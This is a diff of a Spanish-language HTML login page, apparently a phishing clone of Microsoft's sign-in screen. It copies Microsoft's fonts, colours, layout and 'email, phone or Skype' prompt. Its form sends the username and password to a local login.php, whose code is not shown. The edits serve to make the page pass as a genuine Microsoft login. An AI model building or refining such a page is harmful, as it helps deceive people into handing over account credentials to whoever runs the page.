@@ -3,6 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
   <style>
     /* Tu estilo actual aquí */
 
@@ -14,15 +16,32 @@
       align-items: center;
       justify-content: center;
       height: 100vh;
+      height: 100vh;
+      background: url('dd2.png') center/cover no-repeat; /* Reemplaza 'tu-imagen-de-fondo.jpg' con la URL de tu imagen */
+
     }
 
     .container {
+      font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+      font-weight: 400;
+      font-size: .9375rem;
+      line-height: 1.25rem;
+      direction: ltr;
+      color: #1b1b1b;
+      text-align: left;
+      box-sizing: border-box;
+      margin-left: auto;
+      margin-right: auto;
+      position: relative;
+      max-width: 440px;
+      width: calc(100% - 40px);
+      padding: 44px;
       background-color: #fff;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-      padding: 20px;
-      border-radius: 8px;
-      width: 350px;
-      height: 320px;
+      box-shadow: 0 2px 6px rgba(0,0,0,.2);
+      min-height: 338px;
+      overflow: hidden;
+      min-width: 0;
+      margin-bottom: 20px;
     }
 
     form {
@@ -35,43 +54,165 @@
     }
 
     input {
-      padding: 8px;
-      margin-bottom: 16px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
+      box-sizing: border-box;
+      color: inherit;
+      font: inherit;
+      margin: 0;
+      font-family: inherit;
+      font-size: inherit;
+      max-width: 100%;
+      line-height: inherit;
+      display: block;
+      width: 100%;
+      background-image: none;
+      direction: ltr;
+      text-align: left;
+      border-style: solid;
+      padding: 6px 10px;
+      border-width: 1px;
+      border-color: rgba(0,0,0,.6);
+      height: 36px;
+      outline: none;
+      -webkit-border-radius: 0;
+      background-color: transparent;
+      border-top-width: 0;
+      border-left-width: 0;
+      border-right-width: 0;
+      padding-left: 0;
     }
 
     button {
-      background-color: #0f6cbd;
-      color: #fff;
-      padding: 9px;
-      border: none;
-      border-radius: 1px;
+      direction: ltr;
+      box-sizing: border-box;
+      font: inherit;
+      margin: 0;
+      font-family: inherit;
+      font-size: inherit;
+      -webkit-appearance: button;
       cursor: pointer;
-      position: absolute; /* Añadido */
-      bottom: 240px; /* Ajusta según tus necesidades */
-      right: 605px; /* Ajusta según tus necesidades */
-      width: 7%; /* Hace que el botón ocupe el 100% del ancho del contenedor */
-
+      padding: 4px 12px 4px 12px;
+      position: relative;
+      max-width: 100%;
+      text-align: center;
+      white-space: nowrap;
+      overflow: hidden;
+      vertical-align: middle;
+      text-overflow: ellipsis;
+      touch-action: manipulation;
+      min-height: 32px;
+      border: none;
+      min-width: 108px;
+      line-height: normal;
+      margin-top: 0;
+      margin-bottom: 0;
+      color: #fff;
+      border-color: #0067b8;
+      background-color: #0067b8;
+      display: block;
+      width: 100%;
+      bottom: 3px; /* Ajusta según tus necesidades */
+      right: -75%; /* Ajusta según tus necesidades */
+      width: 20%; /* Hace que el botón ocupe el 100% del ancho del contenedor */
     }
 
-button:hover {
-  background-color: #45a049;
-}
+    button:hover {
+      background-color: #45a049;
+    }
 
-/* Estilos específicos para tamaños de pantalla pequeños, como teléfonos */
-@media only screen and (max-width: 600px) {
-  .container {
-    width: 80%; /* Reduce el ancho del contenedor para pantallas pequeñas */
-  }
+    /* Estilos específicos para tamaños de pantalla pequeños, como teléfonos */
+    @media only screen and (max-width: 600px) {
+      .container {
+        width: 90%; /* Reduce el ancho del contenedor para pantallas pequeñas */
+        padding: 20px; /* Reduzca el relleno para pantallas pequeñas */
+      }
 
-  button {
-    padding: 10px; /* Ajusta el padding del botón para pantallas pequeñas */
-    bottom: 300px; /* Ajusta según tus necesidades */
-      right: 70px; /* Ajusta según tus necesidades */
-      width: 24%;
-  }
-}
+      button {
+        padding: 6px; /* Ajuste el relleno del botón para pantallas pequeñas */
+      }
+
+      button {
+        width: 10%; /* Haga que el botón ocupe el 100% del ancho del contenedor */
+      }
+
+      .boton {
+        text-align: center; /* Alinee el botón al centro en pantallas pequeñas */
+        margin-top: 20px;
+      }
+
+      .titulo-personalizado {
+        margin: 10px 0 20px; /* Ajuste los márgenes superior e inferior según tus preferencias */
+      }
+
+      .texto {
+        text-align: center; /* Alinee el texto al centro en pantallas pequeñas */
+      }
+    }
+
+    .boton {
+      font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+      font-weight: 400;
+      font-size: .9375rem;
+      line-height: 1.25rem;
+      direction: ltr;
+      color: #1b1b1b;
+      box-sizing: border-box;
+      min-height: 1px;
+      float: left;
+      width: 100%;
+      padding-left: 0;
+      padding-right: 0;
+      position: absolute;
+      bottom: 30px;
+      right: 60px;
+      text-align: right;
+    }
+
+    .texto {
+      -webkit-text-size-adjust: 100%;
+      font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+      font-weight: 400;
+      line-height: 1.25rem;
+      direction: ltr;
+      color: #1b1b1b;
+      text-align: left;
+      font-size: .8125rem;
+      box-sizing: border-box;
+      margin-bottom: 16px;
+    }
+
+    .forma {
+      -webkit-text-size-adjust: 100%;
+      font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+      font-weight: 400;
+      line-height: 1.25rem;
+      direction: ltr;
+      color: #1b1b1b;
+      text-align: left;
+      font-size: .8125rem;
+      box-sizing: border-box;
+      margin-bottom: 16px;
+    }
+
+    .texto-azul {
+      color: black; /* Color predeterminado del texto */
+    }
+
+    .azul {
+      color: #0067b8; /* Color azul */
+    }
+
+    .titulo-personalizado {
+      -webkit-text-size-adjust: 100%;
+      direction: ltr;
+      text-align: left;
+      line-height: 1.75rem;
+      color: #1b1b1b;
+      font-size: 1.5rem;
+      font-weight: 600;
+      font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+      box-sizing: border-box;
+      margin: 10px 0; /* Ajustar márgenes superior e inferior según tus preferencias */
+    }
   </style>
   <title>Página de Inicio de Sesión</title>
 </head>
@@ -81,11 +222,20 @@ button:hover {
     <img src="swswsw.png" alt="Logo de tu empresa" style="width: 120px; height: 45px; margin-bottom: 0px;">
 
     <form action="login.php" method="post">
-      <h2>Iniciar Sesión</h2>
+      <h2 class="titulo-personalizado">Iniciar Sesión</h2>
+      
       <input type="text" id="username" name="username" placeholder="Correo electrónico, teléfono o Skype" required>
       <input type="password" id="password" name="password" placeholder="Contraseña" required>
+      <div class="texto">
+        <p class="texto-azul">No tiene una cuenta? <span class="azul">Cree una.</span></p>
+      </div>
+      <div class="forma">
 
-      <button type="submit">Ingresar</button>
+      </div>
+      <p></p>
+      <div class="boton" >
+        <button type="submit">Ingresar</button>
+      </div>
     </form>
   </div>
 </body>
